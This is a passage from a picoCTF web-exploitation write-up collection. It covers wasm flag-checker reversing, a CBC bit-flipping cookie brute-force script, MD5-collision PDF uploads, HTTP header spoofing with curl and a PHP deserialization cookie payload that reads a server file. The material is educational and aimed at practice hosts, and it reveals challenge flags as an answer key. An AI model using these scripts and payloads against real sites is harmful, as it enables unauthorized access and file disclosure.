                  parseInt(_0x371ac6(0x1e0)) + 
                  parseInt(_0x371ac6(0x1d8)) * 
                  parseInt(_0x371ac6(0x1ea)) + 
                  -parseInt(_0x371ac6(0x1e5));
          
            if (_0x478583 === _0x3dfcae) break;
            else _0x76dd13['push'](_0x76dd13['shift']());
        } catch (_0x41d31a) {
            _0x76dd13['push'](_0x76dd13['shift']());
        }
    }
}(_0x402c, 0x994c3));
let exports;
(async () => {
    const _0x48c3be = _0x4e0e;
    let _0x5f0229 = await fetch(_0x48c3be(0x1e9))
        , _0x1d99e9 = await WebAssembly[_0x48c3be(0x1df)](await _0x5f0229[_0x48c3be(0x1da)]())
        , _0x1f8628 = _0x1d99e9[_0x48c3be(0x1d6)];
    exports = _0x1f8628['exports'];
})();

function onButtonPress() {
    const _0xa80748 = _0x4e0e;
    let _0x3761f8 = document['getElementById'](_0xa80748(0x1e4))[_0xa80748(0x1dd)];
    for (let _0x16c626 = 0x0; _0x16c626 < _0x3761f8['length']; _0x16c626++) {
        exports[_0xa80748(0x1d7)](_0x3761f8[_0xa80748(0x1ec)](_0x16c626), _0x16c626);
    }
    exports['copy_char'](0x0, _0x3761f8['length']), exports[_0xa80748(0x1e7)]() == 0x1 ? document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)] = _0xa80748(0x1e6) : document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)] = _0xa80748(0x1e8);
}
~~~

There is a call to an external file, ./JIFxzHyW8W.  Downloading this we can inspect it:

~~~bash
$ file JIFxzHyW8W 
JIFxzHyW8W: WebAssembly (wasm) binary module version 0x1 (MVP)
~~~

A binary wasm file.  Using strings we can review the content:

~~~bash
$ strings JIFxzHyW8W 
memory
__wasm_call_ctors
strcmp
check_flag
input
	copy_char
__dso_handle
__data_end
__global_base
__heap_base
__memory_base
__table_base
j!	 
  F!!A
!" ! "q!# #
!% $ %q!& 
!( ' (q!) & )k!* 
!+ +
 	q!
+picoCTF{c733fda95299a16681f37b3ff09f901c}
~~~

This gives us, what looks like the flag: picoCTF{c733fda95299a16681f37b3ff09f901c}

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{c733fda95299a16681f37b3ff09f901c}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## More Cookies

- Author: madStacks
- 90 Points

### Description

I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! http://mercury.picoctf.net:56136/

### Hints

1. https://en.wikipedia.org/wiki/Homomorphic_encryption
2. The search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This challenge suggests there is a cookie that uses homomorphic encryption.  The capitalised CBC suggests this uses [Cipher Block Chaining](https://www.tutorialspoint.com/cryptography/block_cipher_modes_of_operation.htm).  We can use curl to retrieve the cookie:

~~~shell
$ curl -c - 'http://mercury.picoctf.net:56136/'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.# Netscape HTTP Cookie File
# https://curl.haxx.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

mercury.picoctf.net	FALSE	/	FALSE	0	auth_name	dUl1R1lXTXNGMFRETHU1U1VZcnlQY2V1YXpNTzcraVRvR3NTZTNZSzFqVVhJaVdnYlltVGFGZDRmeWNHZzhjY1hOSFJqTHNIc3lac0p6NzFwOFVObFdWTFVZQ3ZFZ2RnSFZLY3RSUFIwNWRYR0dWQjl1cEpORmE5R3BsRnVOb0U=
~~~

This shows a cookie with name "auth_name" and value "dUl1R1lXTXNGMFRETHU1U1VZcnlQY2V1YXpNTzcraVRvR3NTZTNZSzFqVVhJaVdnYlltVGFGZDRmeWNHZzhjY1hOSFJqTHNIc3lac0p6NzFwOFVObFdWTFVZQ3ZFZ2RnSFZLY3RSUFIwNWRYR0dWQjl1cEpORmE5R3BsRnVOb0U=".

With CBC encryption, the plaintext data is block encrypted.  We may be able to change an encrypted admin flag to get the flag by changing a single bit within the encrypted cookie.  We need to understand the cookie first; it appears to be b64 encoded.  Decoding in python:

~~~py
import base64 as b64

c = "dUl1R1lXTXNGMFRETHU1U1VZcnlQY2V1YXpNTzcraVRvR3NTZTNZSzFqVVhJaVdnYlltVGFGZDRmeWNHZzhjY1hOSFJqTHNIc3lac0p6NzFwOFVObFdWTFVZQ3ZFZ2RnSFZLY3RSUFIwNWRYR0dWQjl1cEpORmE5R3BsRnVOb0U="
c = b64.b64decode(c).decode()
print(c)
~~~

This returns:

~~~py
uIuGYWMsF0TDLu5SUYryPceuazMO7+iToGsSe3YK1jUXIiWgbYmTaFd4fycGg8ccXNHRjLsHsyZsJz71p8UNlWVLUYCvEgdgHVKctRPR05dXGGVB9upJNFa9GplFuNoE
~~~

This appears to again, be encoded in base 64:

~~~py
import base64 as b64

c = "dUl1R1lXTXNGMFRETHU1U1VZcnlQY2V1YXpNTzcraVRvR3NTZTNZSzFqVVhJaVdnYlltVGFGZDRmeWNHZzhjY1hOSFJqTHNIc3lac0p6NzFwOFVObFdWTFVZQ3ZFZ2RnSFZLY3RSUFIwNWRYR0dWQjl1cEpORmE5R3BsRnVOb0U="
c = b64.b64decode(c).decode()
c = b64.b64decode(c)
print(c)
~~~
	
This returns a binary string of hex bytes:

~~~py
b'\xb8\x8b\x86ac,\x17D\xc3.\xeeRQ\x8a\xf2=\xc7\xaek3\x0e\xef\xe8\x93\xa0k\x12{v\n\xd65\x17"%\xa0m\x89\x93hWx\x7f\'\x06\x83\xc7\x1c\\\xd1\xd1\x8c\xbb\x07\xb3&l\'>\xf5\xa7\xc5\r\x95eKQ\x80\xaf\x12\x07`\x1dR\x9c\xb5\x13\xd1\xd3\x97W\x18eA\xf6\xeaI4V\xbd\x1a\x99E\xb8\xda\x04'
~~~

This can be loaded into a bytearray. We can retrieve the cookie and decode it using requests:

~~~py
import requests
import base64 as b64

URL  = "http://mercury.picoctf.net:56136"

# Retrieve cookie:
s = requests.Session()
s.get(URL)
s.close()
COOKIE = s.cookies.get_dict()

# extract data:
C_NAME = list(COOKIE.items())[0][1]
C_DATA = list(COOKIE.items())[0][1]

COOKIE_VAL = b64.b64decode(b64.b64decode(C_DATA).decode())
COOKIE_ARR = bytearray(COOKIE_VAL)
~~~

We can now implement the bit shift and look for the flag:

~~~py
HUNT = "picoCTF{"

def new_cookie(index, bit):
    nc_arr = COOKIE_ARR
    nc_arr[i] = nc_arr[i]^j
    nc_val = bytes(nc_arr)
    nc_data = b64.b64encode(b64.b64encode(nc_val)).decode()
    nc = {C_NAME: nc_data}
    return nc

for i in range(len(COOKIE_ARR)):
    for j in range(128):
        cookie = new_cookie(i,j)
        r = requests.get(URL, cookies=cookie)
        if HUNT in r.text:
            webtext = r.text
            start = webtext.index(HUNT)
            webtext = webtext[start:]
            end = webtext.index("}")+1
            webtext = webtext[:end]
            flag = webtext
            print("Flag is: {}".format(flag))
            break
~~~

The entire python code:

~~~py
HUNT = "picoCTF{"
URL  = "http://mercury.picoctf.net:56136"

# Retrieve cookie:
s = requests.Session()
s.get(URL)
s.close()
COOKIE = s.cookies.get_dict()

# extract data:
C_NAME = list(COOKIE.items())[0][0]
C_DATA = list(COOKIE.items())[0][1]

COOKIE_VAL = b64.b64decode(b64.b64decode(C_DATA).decode())
COOKIE_ARR = bytearray(COOKIE_VAL)

def new_cookie(index, bit):
    nc_arr = COOKIE_ARR
    nc_arr[index] = nc_arr[index]^bit
    nc_val = bytes(nc_arr)
    nc_data = b64.b64encode(b64.b64encode(nc_val)).decode()
    nc = {C_NAME: nc_data}
    return nc

def more_cookies():
    for i in range(len(COOKIE_ARR)):
        print("{0:.1f}% tested.".format(i/len(COOKIE_ARR)*100))
        for j in range(128):
            cookie = new_cookie(i,j)
            try:
                s = requests.Session()
                r = s.get(URL, cookies=cookie)
                s.close()
            except:
                print("error at index {} bit shift {}".format(i,j))
            if HUNT in r.text:
                webtext = r.text
                start = webtext.index(HUNT)
                webtext = webtext[start:]
                end = webtext.index("}")+1
                webtext = webtext[:end]
                flag = webtext
                print("Flag is: {}".format(flag))
                return

if __name__ == "__main__":
    more_cookies()
~~~

This iterates through the cookie data Bytes and conducts a simple bit shift.  The response is checked for the string "picoCTF{".  This script returns:

~~~py
0.0% tested.
1.0% tested.
2.1% tested.
3.1% tested.
4.2% tested.
5.2% tested.
6.2% tested.
7.3% tested.
8.3% tested.
9.4% tested.
Flag is: picoCTF{cO0ki3s_yum_e491c430}
~~~
	
</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{cO0ki3s_yum_e491c430}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## It is my birthday

- Author: MADSTACKS
- 100 Points

### Description
	
I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:20277/

### Hints

None

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This exploit requires two colliding pdf-files.  These can be found on [GitHub](https://github.com/corkami/collisions/tree/master/examples/free).  Uploading two pdfs, [md5-1.pdf](https://github.com/corkami/collisions/blob/master/examples/free/md5-1.pdf) and [md5-2.pdf](https://github.com/corkami/collisions/blob/master/examples/free/md5-2.pdf).

When these are submitted, we find the html page for http://mercury.picoctf.net:20277/index.php:

~~~html
 <?php

if (isset($_POST["submit"])) {
    $type1 = $_FILES["file1"]["type"];
    $type2 = $_FILES["file2"]["type"];
    $size1 = $_FILES["file1"]["size"];
    $size2 = $_FILES["file2"]["size"];
    $SIZE_LIMIT = 18 * 1024;

    if (($size1 < $SIZE_LIMIT) && ($size2 < $SIZE_LIMIT)) {
        if (($type1 == "application/pdf") && ($type2 == "application/pdf")) {
            $contents1 = file_get_contents($_FILES["file1"]["tmp_name"]);
            $contents2 = file_get_contents($_FILES["file2"]["tmp_name"]);

            if ($contents1 != $contents2) {
                if (md5_file($_FILES["file1"]["tmp_name"]) == md5_file($_FILES["file2"]["tmp_name"])) {
                    highlight_file("index.php");
                    die();
                } else {
                    echo "MD5 hashes do not match!";
                    die();
                }
            } else {
                echo "Files are not different!";
                die();
            }
        } else {
            echo "Not a PDF!";
            die();
        }
    } else {
        echo "File too large!";
        die();
    }
}

// FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_da36cc1b}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>It is my Birthday</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


</head>

<body>

    <div class="container">
        <div class="header">
            <h3 class="text-muted">It is my Birthday</h3>
        </div>
        <div class="jumbotron">
            <p class="lead"></p>
            <div class="row">
                <div class="col-xs-12 col-sm-12 col-md-12">
                    <h3>See if you are invited to my party!</h3>
                </div>
            </div>
            <br/>
            <div class="upload-form">
                <form role="form" action="/index.php" method="post" enctype="multipart/form-data">
                <div class="row">
                    <div class="form-group">
                        <input type="file" name="file1" id="file1" class="form-control input-lg">
                        <input type="file" name="file2" id="file2" class="form-control input-lg">
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12">
                        <input type="submit" class="btn btn-lg btn-success btn-block" name="submit" value="Upload">
                    </div>
                </div>
                </form>
            </div>
        </div>
    </div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>

</div>

<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

</html> 
~~~
	
</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{c0ngr4ts_u_r_1nv1t3d_da36cc1b}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Who are you

- Author: MADSTACKS
- 100 Points

### Description

Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:52362/

### Hints

1. It ain't much, but it's an RFC https://tools.ietf.org/html/rfc2616

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

If we visit the website, we get the message "Only people who use the official PicoBrowser are allowed on this site!".  This is shown in the HTML source:

~~~html
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Who are you?</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


</head>

<body>

    <div class="container">
      <div class="jumbotron">
        <p class="lead"></p>
		<div class="row">
			<div class="col-xs-12 col-sm-12 col-md-12">
				<h3 style="color:red">Only people who use the official PicoBrowser are allowed on this site!</h3>
			</div>
		</div>
		<br/>
		
			<img src="/static/who_r_u.gif"></img>
		
	</div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>

</div>
<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

</html>
~~~

We can isolate this header content in curl:

~~~shell
$ curl -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
Only people who use the official PicoBrowser are allowed on this site!
~~~

The user agent for curl can be changed using the -A flag:

~~~shell
$ curl -A "picobrowser" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
I don&#39;t trust users visiting from another site.
~~~

We need to appear to be refered from the same website.  The referer can be set in curl using the -e flag:

~~~shell
$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
Sorry, this site only worked in 2018.
~~~

We now need to change the date of the request;  this can be done in curl using the header flag -H which enables us to inject headers into the query:

~~~shell
$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -H "date: Mon, 1 Jan 2018 00:00:01" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
I don&#39;t trust users who can be tracked.
~~~

Again, the Do Not Track header can be added:

~~~shell
$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -H "date: Mon, 1 Jan 2018 00:00:01" -H "DNT: 1" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
This website is only for people from Sweden.
~~~
	
We now need to appear to visit from Sweden. We can add a X-Forwarded-For header with a Swedish IP address:

~~~shell
$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -H "date: Mon, 1 Jan 2018 00:00:01" -H "DNT: 1" -H "X-Forwarded-For: 95.199.152.150" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
You&#39;re in Sweden but you don&#39;t speak Swedish?
~~~

The language can be changed using the Accept-Language header with the language code sv:

~~~shell
$ curl -A "picobrowser" -e "http://mercury.picoctf.net:52362" -H "date: Mon, 1 Jan 2018 00:00:01" -H "DNT: 1" -H "X-Forwarded-For: 95.199.152.150" -H "Accept-Language: sv" -s http://mercury.picoctf.net:52362 | grep h3 | sed -e 's/<h3 style="color:red">\(.*\)<\/h3>/\1/'
<h3 style="color:green">What can I say except, you are welcome</h3>
<b>picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}</b>
~~~

This gives us the flag:

~~~
picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0c0db339}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Some Assembly Required 2

- Author: SEARS SCHULZ
- 110 Points

### Description

http://mercury.picoctf.net:48841/index.html

### Hints

None

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we can inspect the source:

~~~html
<html>
<head>
	<meta charset="UTF-8">
	<script src="Y8splx37qY.js"></script>
</head>
<body>
	<h4>Enter flag:</h4>
	<input type="text" id="input"/>
	<button onclick="onButtonPress()">Submit</button>
	<p id="result"></p>
</body>
</html>
~~~

This calls and external javascript file, Y8splx37qY.js:

~~~js
const _0x6d8f = ['copy_char', 
                 'value', 
                 '207aLjBod', 
                 '1301420SaUSqf', 
                 '233ZRpipt', 
                 '2224QffgXU', 
                 'check_flag', 
                 '408533hsoVYx', 
                 'instance', 
                 '278338GVFUrH', 
                 'Correct!', 
                 '549933ZVjkwI', 
                 'innerHTML', 
                 'charCodeAt', 
                 './aD8SvhyVkb', 
                 'result', 
                 '977AzKzwq', 
                 'Incorrect!', 
                 'exports', 
                 'length', 
                 'getElementById', 
                 '1jIrMBu', 
                 'input', 
                 '615361geljRK'];
const _0x5c00 = function(_0x58505a, _0x4d6e6c) {
    _0x58505a = _0x58505a - 0xc3;
    let _0x6d8fc4 = _0x6d8f[_0x58505a];
    return _0x6d8fc4;
};
(function(_0x12fd07, _0x4e9d05) {
    const _0x4f7b75 = _0x5c00;
    while (!![]) {
        try {
            const _0x1bb902 = -parseInt(_0x4f7b75(0xc8)) * -parseInt(_0x4f7b75(0xc9)) + -parseInt(_0x4f7b75(0xcd)) + parseInt(_0x4f7b75(0xcf)) + parseInt(_0x4f7b75(0xc3)) + -parseInt(_0x4f7b75(0xc6)) * parseInt(_0x4f7b75(0xd4)) + parseInt(_0x4f7b75(0xcb)) + -parseInt(_0x4f7b75(0xd9)) * parseInt(_0x4f7b75(0xc7));
            if (_0x1bb902 === _0x4e9d05) break;
            else _0x12fd07['push'](_0x12fd07['shift']());
        } catch (_0x4f8a) {
            _0x12fd07['push'](_0x12fd07['shift']());
        }
    }
}(_0x6d8f, 0x4bb06));
let exports;
(async () => {
    const _0x835967 = _0x5c00;
    let _0x1adb5f = await fetch(_0x835967(0xd2)),
        _0x355961 = await WebAssembly['instantiate'](await _0x1adb5f['arrayBuffer']()),
        _0x5c0ffa = _0x355961[_0x835967(0xcc)];
    exports = _0x5c0ffa[_0x835967(0xd6)];
})();

function onButtonPress() {
    const _0x50ea62 = _0x5c00;
    let _0x5f4170 = document[_0x50ea62(0xd8)](_0x50ea62(0xda))[_0x50ea62(0xc5)];
    for (let _0x19d3ca = 0x0; _0x19d3ca < _0x5f4170['length']; _0x19d3ca++) {
        exports[_0x50ea62(0xc4)](_0x5f4170[_0x50ea62(0xd1)](_0x19d3ca), _0x19d3ca);
    }
    exports['copy_char'](0x0, _0x5f4170[_0x50ea62(0xd7)]), exports[_0x50ea62(0xca)]() == 0x1 ? document['getElementById'](_0x50ea62(0xd3))[_0x50ea62(0xd0)] = _0x50ea62(0xce) : document[_0x50ea62(0xd8)](_0x50ea62(0xd3))['innerHTML'] = _0x50ea62(0xd5);
}
~~~

This includes a call to an external file in the site directory: ./aD8SvhyVkb.  Navigating to this, provides a wasm file which can be decompiled:
						    
~~~bash
$ wasm-decompile aD8SvhyVkb > decompiled_wasm.txt
~~~

This text file shows:

~~~
export memory memory(initial: 2, max: 0);

global g_a:int = 66864;
export global input:int = 1072;
global dso_handle:int = 1024;
global data_end:int = 1328;
global global_base:int = 1024;
global heap_base:int = 66864;
global memory_base:int = 0;
global table_base:int = 1;

table T_a:funcref(min: 1, max: 1);

data d_a(offset: 1024) = 
"xakgK\Ns>j:<?m8>m;>k110<j?=88lj0l11:n;nmu\00\00";

function wasm_call_ctors() {
}

export function strcmp(a:int, b:int):int {
  var c:int = g_a;
  var d:int = 32;
  var e:int = c - d;
  e[6]:int = a;
  e[5]:int = b;
  var f:int = e[6]:int;
  e[4]:int = f;
  var g:int = e[5]:int;
  e[3]:int = g;
  loop L_b {
    var h:ubyte_ptr = e[4]:int;
    var i:int = 1;
    var j:int = h + i;
    e[4]:int = j;
    var k:int = h[0];
    e[11]:byte = k;
    var l:ubyte_ptr = e[3]:int;
    var m:int = 1;
    var n:int = l + m;
    e[3]:int = n;
    var o:int = l[0];
    e[10]:byte = o;
    var p:int = e[11]:ubyte;
    var q:int = 255;
    var r:int = p & q;
    if (r) goto B_c;
    var s:int = e[11]:ubyte;
    var t:int = 255;
    var u:int = s & t;
    var v:int = e[10]:ubyte;
    var w:int = 255;
    var x:int = v & w;
    var y:int = u - x;
    e[7]:int = y;
    goto B_a;
    label B_c:
    var z:int = e[11]:ubyte;
    var aa:int = 255;
    var ba:int = z & aa;
    var ca:int = e[10]:ubyte;
    var da:int = 255;
    var ea:int = ca & da;
    var fa:int = ba;
    var ga:int = ea;
    var ha:int = fa == ga;
    var ia:int = 1;
    var ja:int = ha & ia;
    if (ja) continue L_b;
  }
  var ka:int = e[11]:ubyte;
  var la:int = 255;
  var ma:int = ka & la;
  var na:int = e[10]:ubyte;
  var oa:int = 255;
  var pa:int = na & oa;
  var qa:int = ma - pa;
  e[7]:int = qa;
  label B_a:
  var ra:int = e[7]:int;
  return ra;
}

export function check_flag():int {
  var a:int = 0;
  var b:int = 1072;
  var c:int = 1024;
  var d:int = strcmp(c, b);
  var e:int = d;
  var f:int = a;
  var g:int = e != f;
  var h:int = -1;
  var i:int = g ^ h;
  var j:int = 1;
  var k:int = i & j;
  return k;
}

function copy(a:int, b:int) {
  var c:int = g_a;
  var d:int = 16;
  var e:int_ptr = c - d;
  e[3] = a;
  e[2] = b;
  var f:int = e[3];
  if (eqz(f)) goto B_a;
  var g:int = e[3];
  var h:int = 8;
  var i:int = g ^ h;
  e[3] = i;
  label B_a:
  var j:int = e[3];
  var k:byte_ptr = e[2];
  k[1072] = j;
}
~~~

This shows the enciphered flag:

~~~
xakgK\Ns>j:<?m8>m;>k110<j?=88lj0l11:n;nmu\00\00
~~~

This is manipulated in the copy function (xor with 8).  The flag can be recovered:

~~~py
enc = b'xakgK\Ns>j:<?m8>m;>k110<j?=88lj0l11:n;nmu\00\00'

flag = ""

for a in enc:
    flag += (chr(a^8))
~~~

This returns the flag.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{6b247e06e36c9984b7500db8d992f3fe}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Super Serial

- Author: MADSTACKS
- 130 Points

### Description

Try to recover the flag stored on this website http://mercury.picoctf.net:14804/

### Hints

1. The flag is at ../flag

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can navigate to the website and view the source:

~~~html

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Sign In</h5>
														<form class="form-signin" action="index.php" method="post">
								<div class="form-label-group">
									<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
									<label for="user">Username</label>
								</div>

								<div class="form-label-group">
									<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
									<label for="pass">Password</label>
								</div>

								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
~~~

This shows the form calls an external file, "index.php" which is the homepage.  Reviewing the robots.txt file we see:

~~~txt
User-agent: *
Disallow: /admin.phps
~~~

This references "admin.phps"; a quick search and we see ".phps" is a [PHP source file](https://stackoverflow.com/questions/41689479/what-is-the-file-extension-phps-and-what-is-it-used-for).  Back to index.php, we try index.phps and get a new source:

~~~html
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
~~~

This provides the php header and references cookie.php and authentication.php.  It provides the parameters for the cookie:

~~~php
setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
~~~

This serialises a value $perm_res and encodes it to the login cookie.  Reviewing cookie.phps, we can see:

~~~php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
~~~

We can see if the $perm value is checked against is_admin() and is_guest(). If we change the $perm value to a different object, this will throw and error and call the catch(Error) statement that prints the deserialised value $perm.  Reviewing authentication.phps, we can see a new class "access_log" is declared:

~~~php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
~~~

If we serialise $perm to a different class object, we can print the access log file via the __toString method. We can generate a new access_log object:

~~~php
new access_log("../flag")
~~~

Serialising this in an [online compiler](https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler), we get:

~~~php
<?php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
echo("Serialised access_log object:");
echo("<br>");
echo(serialize(new access_log("../flag")));
echo("<br>");
echo("<br>");
echo("Base64 encoded:");
echo("<br>");
echo(urlencode(base64_encode(serialize(new access_log("../flag")))));
?>
~~~

Which returns:

~~~
Serialised access_log object:
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}

Base64 encoded:
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9 
~~~

We create a new login cookie with this encoded access_log object and can retrieve the flag from authentication.php
	
</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_261d1dcc}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Most Cookies

- Author: madStacks
- 150 Points

### Description

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:35697/

### Hints

1. How secure is a flask cookie?

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Some Assembly Required 3

- Author: SEARS SCHULZ
- 160 Points

### Description

http://mercury.picoctf.net:60022/index.html

### Hints

None

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find the html source code:

~~~html
<html>
<head>
	<meta charset="UTF-8">
	<script src="rTEuOmSfG3.js"></script>
</head>
<body>
